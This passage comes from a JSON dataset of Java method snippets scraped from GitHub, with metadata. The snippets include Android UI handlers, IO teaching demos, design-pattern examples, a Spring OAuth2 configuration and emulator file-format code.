"https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/language/VelocityLanguageDriver.java", "stars": "15", "class": {"name": "VelocityLanguageDriver", "extends": null, "implements": ["LanguageDriver"], "modifiers": ["public"]}}, {"method_name": "createSqlSource", "params": ["Configuration", "String", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "SqlSource", "snippet": "  public SqlSource createSqlSource(Configuration configuration, String script, Class<?> parameterType) {    return new VelocitySqlSource(configuration, script);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/language/VelocityLanguageDriver.java", "stars": "15", "class": {"name": "VelocityLanguageDriver", "extends": null, "implements": ["LanguageDriver"], "modifiers": ["public"]}}, {"method_name": "act", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void act()     {        // Add your action code here.    }", "url": "https://raw.githubusercontent.com/jesus-antulio/Tankzors-Fangame/master/Title.java", "stars": "1", "class": {"name": "Title", "extends": "Actor", "implements": null, "modifiers": ["public"]}}, {"method_name": "onKeyPreIme", "params": ["int", "android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onKeyPreIme (int p0, android.view.KeyEvent p1)\t{\t\treturn n_onKeyPreIme (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryCellEditText.java", "stars": "2", "class": {"name": "EntryCellEditText", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onKeyPreIme", "params": ["int", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onKeyPreIme (int p0, android.view.KeyEvent p1);\tpublic void onFocusChanged (boolean p0, int p1, android.graphics.Rect p2)\t{\t\tn_onFocusChanged (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryCellEditText.java", "stars": "2", "class": {"name": "EntryCellEditText", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onFocusChanged", "params": ["boolean", "int", "android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onFocusChanged (boolean p0, int p1, android.graphics.Rect p2)\t{\t\tn_onFocusChanged (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryCellEditText.java", "stars": "2", "class": {"name": "EntryCellEditText", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onFocusChanged", "params": ["boolean", "int", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onFocusChanged (boolean p0, int p1, android.graphics.Rect p2);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryCellEditText.java", "stars": "2", "class": {"name": "EntryCellEditText", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryCellEditText.java", "stars": "2", "class": {"name": "EntryCellEditText", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryCellEditText.java", "stars": "2", "class": {"name": "EntryCellEditText", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "act", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void act()     {        // Add your action code here.    }", "url": "https://raw.githubusercontent.com/jesus-antulio/Tankzors-Fangame/master/Pared.java", "stars": "1", "class": {"name": "Pared", "extends": "Actor", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {        //1.\u521b\u5efaFileInputStream\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a\u8981\u8bfb\u53d6\u7684\u6570\u636e\u6e90        FileInputStream fis = new FileInputStream(\"10_IO\\\\a.txt\");        //2.\u521b\u5efaBufferedInputStream\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012FileInputStream\u5bf9\u8c61,\u63d0\u9ad8FileInputStream\u5bf9\u8c61\u7684\u8bfb\u53d6\u6548\u7387        BufferedInputStream bis = new BufferedInputStream(fis);        //3.\u4f7f\u7528BufferedInputStream\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5read,\u8bfb\u53d6\u6587\u4ef6        //int read()\u4ece\u8f93\u5165\u6d41\u4e2d\u8bfb\u53d6\u6570\u636e\u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\u3002        /*int len = 0;//\u8bb0\u5f55\u6bcf\u6b21\u8bfb\u53d6\u5230\u7684\u5b57\u8282        while((len = bis.read())!=-1){            System.out.println(len);        }*/        //int read(byte[] b) \u4ece\u8f93\u5165\u6d41\u4e2d\u8bfb\u53d6\u4e00\u5b9a\u6570\u91cf\u7684\u5b57\u8282\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5728\u7f13\u51b2\u533a\u6570\u7ec4 b \u4e2d\u3002        byte[] bytes =new byte[1024];//\u5b58\u50a8\u6bcf\u6b21\u8bfb\u53d6\u7684\u6570\u636e        int len = 0; //\u8bb0\u5f55\u6bcf\u6b21\u8bfb\u53d6\u7684\u6709\u6548\u5b57\u8282\u4e2a\u6570        while((len = bis.read(bytes))!=-1){            System.out.println(new String(bytes,0,len));        }        //4.\u91ca\u653e\u8d44\u6e90        bis.close();    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/21.%E3%80%90%E7%BC%93%E5%86%B2%E6%B5%81%E3%80%81%E8%BD%AC%E6%8D%A2%E6%B5%81%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E3%80%81%E6%89%93%E5%8D%B0%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/10_IO/src/com/itheima/demo01/BufferedStream/Demo02BufferedInputStream.java", "stars": "2", "class": {"name": "Demo02BufferedInputStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onOK", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onOK() {        final float diameter = Float.parseFloat(textFieldDiameter.getText());        final float height = Float.parseFloat(textFieldHeight.getText());        final Wood wood = (Wood) comboBoxWood.getSelectedItem();        try {            cylinder = new Cylinder(wood, height, diameter);        } catch (Exception e) {            JOptionPane.showMessageDialog(null, e.getMessage(), \"Cylinder dialog error\", JOptionPane.ERROR_MESSAGE);            cylinder = null;        }        setVisible(false);    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/view/DlgCylinder.java", "stars": "2", "class": {"name": "DlgCylinder", "extends": "JDialog", "implements": ["IWoodDialog"], "modifiers": ["public"]}}, {"method_name": "onCancel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onCancel() {        cylinder = null;        setVisible(false);    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/view/DlgCylinder.java", "stars": "2", "class": {"name": "DlgCylinder", "extends": "JDialog", "implements": ["IWoodDialog"], "modifiers": ["public"]}}, {"method_name": "getObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getObject() {        return cylinder;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/view/DlgCylinder.java", "stars": "2", "class": {"name": "DlgCylinder", "extends": "JDialog", "implements": ["IWoodDialog"], "modifiers": ["public"]}}, {"method_name": "setWoodDirectory", "params": ["WoodDirectory"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWoodDirectory(WoodDirectory woodDirectory) {        comboBoxWood.setModel(new DefaultComboBoxModel<>(woodDirectory.getArr()));    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/view/DlgCylinder.java", "stars": "2", "class": {"name": "DlgCylinder", "extends": "JDialog", "implements": ["IWoodDialog"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"Cylinder\";    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/view/DlgCylinder.java", "stars": "2", "class": {"name": "DlgCylinder", "extends": "JDialog", "implements": ["IWoodDialog"], "modifiers": ["public"]}}, {"method_name": "start", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void start(Activity act) {        Intent starter = new Intent(act, GraceViewPagerActivity.class);        act.startActivity(starter);    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "GraceViewPagerActivity", "extends": "AppCompatActivity", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_grace_view_pager);        buildTestData();        mViewPager = findViewById(R.id.vp);        mAdapter = new Adapter(mData);        mViewPager.setGraceAdapter(mAdapter);        mViewPager.setGracePageTransformer(false, new Transformer(mAdapter));        mViewPager.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {            @Override            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {            }            @Override            public void onPageSelected(int position) {                Log.d(TAG, \"onPageSelected() called with: position = [\" + position + \"]\");            }            @Override            public void onPageScrollStateChanged(int state) {            }        });        mPlaceholderView = findViewById(R.id.placeholder);        findViewById(R.id.ratio_btn).setOnClickListener(this);        findViewById(R.id.horitontal_btn).setOnClickListener(this);        findViewById(R.id.vertical_btn).setOnClickListener(this);        findViewById(R.id.reverse_btn).setOnClickListener(this);        findViewById(R.id.add_btn).setOnClickListener(this);        findViewById(R.id.delete_btn).setOnClickListener(this);        findViewById(R.id.change_padding_btn).setOnClickListener(this);        findViewById(R.id.change_margin_btn).setOnClickListener(this);        findViewById(R.id.locate_btn).setOnClickListener(this);        findViewById(R.id.smooth_btn).setOnClickListener(this);    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "GraceViewPagerActivity", "extends": "AppCompatActivity", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "buildTestData", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void buildTestData() {        for (int i = 0; i < 10; i++) {            mData.add(\"item:\" + i);        }    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "GraceViewPagerActivity", "extends": "AppCompatActivity", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {        int _50dp = dip2px(50);        int _80dp = dip2px(80);        switch (v.getId()) {            case R.id.ratio_btn:                float ratio = mViewPager.getPageHeightWidthRatio();                if (ratio == 2) {                    ratio = 1;                } else {                    ratio = 2;                }                // \u52a8\u6001\u4fee\u6539\u6bd4\u4f8b                mViewPager.setPageHeightWidthRatio(ratio);                break;            case R.id.horitontal_btn:                int horizontalMinMargin = mViewPager.getPageHorizontalMinMargin();                if (horizontalMinMargin == _50dp) {                    horizontalMinMargin = _80dp;                } else {                    horizontalMinMargin = _50dp;                }                // \u52a8\u6001\u4fee\u6539\u6c34\u5e73\u6700\u5c0f\u95f4\u8ddd                mViewPager.setPageHorizontalMinMargin(horizontalMinMargin);                break;            case R.id.vertical_btn:                int verticalMinMargin = mViewPager.getPageVerticalMinMargin();                if (verticalMinMargin == _50dp) {                    verticalMinMargin = _80dp;                } else {                    verticalMinMargin = _50dp;                }                // \u52a8\u6001\u4fee\u6539\u5782\u76f4\u6700\u5c0f\u95f4\u8ddd                mViewPager.setPageVerticalMinMargin(verticalMinMargin);                break;            case R.id.reverse_btn:                Collections.reverse(mData);                mAdapter.notifyDataSetChanged();                break;            case R.id.add_btn:                mData.add(mViewPager.getCurrentItem(), \"add item:\" + mData.size());                mAdapter.notifyDataSetChanged();                break;            case R.id.delete_btn:                if (mData.size() > 0) {                    mData.remove(mViewPager.getCurrentItem());                    mAdapter.notifyDataSetChanged();                }                break;            case R.id.change_padding_btn:                boolean visible = mPlaceholderView.getVisibility() == View.VISIBLE;                mPlaceholderView.setVisibility(visible ? View.GONE : View.VISIBLE);                break;            case R.id.change_margin_btn:                int pageMargin = mViewPager.getPageMargin();                if (pageMargin == 0) {                    pageMargin = dip2px(10);                } else {                    pageMargin = 0;                }                // \u4fee\u6539pageMargin//                mViewPager.setPageMargin(pageMargin);                mViewPager.setGracePageMargin(pageMargin);                break;            case R.id.locate_btn:            case R.id.smooth_btn:                int nextInt = new Random().nextInt(mData.size());                mViewPager.setCurrentItem(nextInt, v.getId() == R.id.smooth_btn);                break;        }    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "GraceViewPagerActivity", "extends": "AppCompatActivity", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "dip2px", "params": ["float"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int dip2px(float dpValue) {        final float scale = getResources().getDisplayMetrics().density;        return (int) (dpValue * scale + 0.5f);    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "GraceViewPagerActivity", "extends": "AppCompatActivity", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "transformPageWithCorrectPosition", "params": ["View", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void transformPageWithCorrectPosition(@NonNull View page, float position) {            if (position >= -1 && position <= 1) {                // [-1,1]\uff0c\u4e2d\u95f4\u4ee5\u53ca\u76f8\u90bb\u7684\u9875\u9762\uff0c\u4e00\u822c\u76f8\u90bb\u7684\u624d\u4f1a\u7528\u4e8e\u8ba1\u7b97\u52a8\u753b                float scale = SCALE + (1 - SCALE) * (1 - Math.abs(position));                page.setScaleX(scale);                page.setScaleY(scale);            } else {                // [-Infinity,-1)\u3001(1,+Infinity]\uff0c\u8d85\u51fa\u76f8\u90bb\u7684\u8303\u56f4                page.setScaleX(SCALE);                page.setScaleY(SCALE);            }        }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "Transformer", "extends": "GracePageTransformer", "implements": null, "modifiers": ["private"]}}, {"method_name": "instantiateItemView", "params": ["ViewGroup", "String", "int"], "throws": null, "modifiers": ["protected"], "return_type": "View", "snippet": "        protected View instantiateItemView(@NonNull ViewGroup container, String item, int position) {            return getLayoutInflater().inflate(R.layout.page_item, container, false);        }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "Adapter", "extends": "GracePagerAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "bindItemView", "params": ["View", "String", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void bindItemView(@NonNull View itemView, String item, int position, boolean first) {            TextView tv = itemView.findViewById(R.id.tv);            tv.setText(item);        }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/app/src/main/java/com/lancewu/graceviewpager/example/GraceViewPagerActivity.java", "stars": "331", "class": {"name": "Adapter", "extends": "GracePagerAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "getSon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getSon() {\t\treturn son;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprStm.java", "stars": "3", "class": {"name": "ExprStm", "extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "createVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Video", "snippet": "    public Video createVideo() {        System.out.println(\"\u5f55\u5236Java\u8bfe\u7a0b\u89c6\u9891\");        return new JavaVideo();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/JavaCourseFactory.java", "stars": "2", "class": {"name": "JavaCourseFactory", "extends": null, "implements": ["CourseFactory"], "modifiers": ["public"]}}, {"method_name": "createNote", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Note", "snippet": "    public Note createNote() {        System.out.println(\"\u7f16\u5199Java\u8bfe\u7a0b\u7b14\u8bb0\");        return new JavaNote();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/JavaCourseFactory.java", "stars": "2", "class": {"name": "JavaCourseFactory", "extends": null, "implements": ["CourseFactory"], "modifiers": ["public"]}}, {"method_name": "configure", "params": ["AuthorizationServerEndpointsConfigurer"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {        TokenEnhancerChain tokenEnhancerChain = new TokenEnhancerChain();        tokenEnhancerChain.setTokenEnhancers(Arrays.asList(jwtTokenEnhancer, jwtAccessTokenConverter));        endpoints.tokenStore(tokenStore)                             //JWT                .accessTokenConverter(jwtAccessTokenConverter)       //JWT                .tokenEnhancer(tokenEnhancerChain)                   //JWT                .authenticationManager(authenticationManager)                .userDetailsService(userDetailsService);    }", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-auth2-service/src/main/java/com/iiht/stock/auth/security/JWTOAuth2Config.java", "stars": "2", "class": {"name": "JWTOAuth2Config", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "configure", "params": ["ClientDetailsServiceConfigurer"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {        clients.inMemory()\t\t\t\t.withClient(\"cloudsimpleservice\")\t\t\t\t.secret(\"mysecret\")                .authorizedGrantTypes(\"refresh_token\", \"password\", \"client_credentials\")                .scopes(\"webclient\", \"mobileclient\");    }", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-auth2-service/src/main/java/com/iiht/stock/auth/security/JWTOAuth2Config.java", "stars": "2", "class": {"name": "JWTOAuth2Config", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "onRun", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRun(final String[] s) {        boolean found = false;        if (s.length <= 1) {            ChatUtil.print(\"Not enough args.\");            return;        }        final Module m = Mercury.INSTANCE.getModuleManager().getAlias(s[1]);        if (m != null) {            found = true;            ChatUtil.print(\"Toggled \" + m.getLabel() + (m.isEnabled() ? ChatFormatting.RED + \" OFF\" : ChatFormatting.GREEN + \" ON\") + ChatFormatting.WHITE + \"!\");            m.toggle();        }        if (!found) {            ChatUtil.print(\"Module \" + s[1] + \" not found.\");        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/commands/ToggleCommand.java", "stars": "12", "class": {"name": "ToggleCommand", "extends": "Command", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreatePullToRefreshListView", "params": ["LayoutInflater", "Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "PullToRefreshExpandableListView", "snippet": "\tprotected PullToRefreshExpandableListView onCreatePullToRefreshListView(LayoutInflater inflater,\t\t\tBundle savedInstanceState) {\t\treturn new PullToRefreshExpandableListView(getActivity());\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-PullToRefresh-master/extras/PullToRefreshListFragment/src/com/handmark/pulltorefresh/extras/listfragment/PullToRefreshExpandableListFragment.java", "stars": "74", "class": {"name": "PullToRefreshExpandableListFragment", "extends": "PullToRefreshBaseListFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "newInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "TestFragmentC", "snippet": "    public static TestFragmentC newInstance() {        return new TestFragmentC();    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/TestFragmentC.java", "stars": "1", "class": {"name": "TestFragmentC", "extends": "MyFragment", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getLayoutId", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {        return R.layout.fragment_test_c;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/TestFragmentC.java", "stars": "1", "class": {"name": "TestFragmentC", "extends": "MyFragment", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "initView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {        setOnClickListener(R.id.btn_test_image1, R.id.btn_test_image2, R.id.btn_test_image3, R.id.btn_test_image4, R.id.btn_test_toast,                R.id.btn_test_permission, R.id.btn_test_setting, R.id.btn_test_state_black, R.id.btn_test_state_white);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/TestFragmentC.java", "stars": "1", "class": {"name": "TestFragmentC", "extends": "MyFragment", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "initData", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/TestFragmentC.java", "stars": "1", "class": {"name": "TestFragmentC", "extends": "MyFragment", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "isStatusBarEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isStatusBarEnabled() {        // \u4f7f\u7528\u6c89\u6d78\u5f0f\u72b6\u6001\u680f        return !super.isStatusBarEnabled();    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/TestFragmentC.java", "stars": "1", "class": {"name": "TestFragmentC", "extends": "MyFragment", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {        switch (v.getId()) {            case R.id.btn_test_image1:                mImageView.setVisibility(View.VISIBLE);                GlideApp.with(this)                        .load(\"https://www.baidu.com/img/bd_logo.png\")                        .into(mImageView);                break;            case R.id.btn_test_image2:                mImageView.setVisibility(View.VISIBLE);                GlideApp.with(this)                        .load(\"https://www.baidu.com/img/bd_logo.png\")                        .circleCrop()                        .into(mImageView);                break;            case R.id.btn_test_image3:                mImageView.setVisibility(View.VISIBLE);                GlideApp.with(this)                        .load(\"https://www.baidu.com/img/bd_logo.png\")                        .transform(new RoundedCorners((int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 20, this.getResources().getDisplayMetrics())))                        .into(mImageView);                break;            case R.id.btn_test_image4:                PhotoActivity.start(getAttachActivity(), new PhotoActivity.OnPhotoSelectListener() {                    @Override                    public void onSelected(List<String> data) {                        mImageView.setVisibility(View.VISIBLE);                        GlideApp.with(getAttachActivity())                                .load(data.get(0))                                .into(mImageView);                    }                    @Override                    public void onCancel() {                        toast(\"\u53d6\u6d88\u4e86\");                    }                });                break;            case R.id.btn_test_toast:                toast(\"\u6211\u662f\u5410\u53f8\");                break;            case R.id.btn_test_permission:                XXPermissions.with(getAttachActivity())                        // \u53ef\u8bbe\u7f6e\u88ab\u62d2\u7edd\u540e\u7ee7\u7eed\u7533\u8bf7\uff0c\u76f4\u5230\u7528\u6237\u6388\u6743\u6216\u8005\u6c38\u4e45\u62d2\u7edd                        //.constantRequest()                        // \u652f\u6301\u8bf7\u6c426.0\u60ac\u6d6e\u7a97\u6743\u96508.0\u8bf7\u6c42\u5b89\u88c5\u6743\u9650                        //.permission(Permission.SYSTEM_ALERT_WINDOW, Permission.REQUEST_INSTALL_PACKAGES)                        // \u4e0d\u6307\u5b9a\u6743\u9650\u5219\u81ea\u52a8\u83b7\u53d6\u6e05\u5355\u4e2d\u7684\u5371\u9669\u6743\u9650                        .permission(Permission.CAMERA)                        .request(new OnPermission() {                            @Override                            public void hasPermission(List<String> granted, boolean isAll) {                                if (isAll) {                                    toast(\"\u83b7\u53d6\u6743\u9650\u6210\u529f\");                                } else {                                    toast(\"\u83b7\u53d6\u6743\u9650\u6210\u529f\uff0c\u90e8\u5206\u6743\u9650\u672a\u6b63\u5e38\u6388\u4e88\");                                }                            }                            @Override                            public void noPermission(List<String> denied, boolean quick) {                                if(quick) {                                    toast(\"\u88ab\u6c38\u4e45\u62d2\u7edd\u6388\u6743\uff0c\u8bf7\u624b\u52a8\u6388\u4e88\u6743\u9650\");                                    //\u5982\u679c\u662f\u88ab\u6c38\u4e45\u62d2\u7edd\u5c31\u8df3\u8f6c\u5230\u5e94\u7528\u6743\u9650\u7cfb\u7edf\u8bbe\u7f6e\u9875\u9762                                    XXPermissions.gotoPermissionSettings(getAttachActivity());                                } else {                                    toast(\"\u83b7\u53d6\u6743\u9650\u5931\u8d25\");                                }                            }                        });                break;            case R.id.btn_test_setting:                XXPermissions.gotoPermissionSettings(getAttachActivity());                break;            case R.id.btn_test_state_black:                if (getAttachActivity().getStatusBarConfig() != null) {                    getAttachActivity().getStatusBarConfig().statusBarDarkFont(true).init();                }                break;            case R.id.btn_test_state_white:                if (getAttachActivity().getStatusBarConfig() != null) {                    getAttachActivity().getStatusBarConfig().statusBarDarkFont(false).init();                }                break;            default:                break;        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/TestFragmentC.java", "stars": "1", "class": {"name": "TestFragmentC", "extends": "MyFragment", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "checkMagic", "params": ["InputStream", "byte"], "throws": ["InvalidFormatException", "EOFException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkMagic(InputStream in, byte[] buffer)            throws InvalidFormatException, EOFException, IOException {        int buflen;        buflen = in.read(buffer, 0, 4);        if (buflen == -1) {            throw new EOFException();        }        else if (buflen < 4) {            throw new InvalidFormatException(\"\u30d5\u30a1\u30a4\u30eb\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u304c\u9055\u3044\u307e\u3059\u3002\");        }        int value = convertLEToInteger(buffer, 0, 4);        if (value != MAGIC_NUMBER) {            throw new InvalidFormatException(\"\u30d5\u30a1\u30a4\u30eb\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u304c\u9055\u3044\u307e\u3059\u3002\");        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "writeMagic", "params": ["OutputStream"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeMagic(OutputStream out) throws IOException {        out.write(MAGIC_NUMBER & 0xff);        out.write((MAGIC_NUMBER & 0xff00) >> 8);        out.write((MAGIC_NUMBER & 0xff0000) >> 16);        out.write((MAGIC_NUMBER & 0xff000000) >> 24);    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "readInteger", "params": ["InputStream", "byte", "int", "int", "String"], "throws": ["InvalidFormatException", "EOFException", "IOException"], 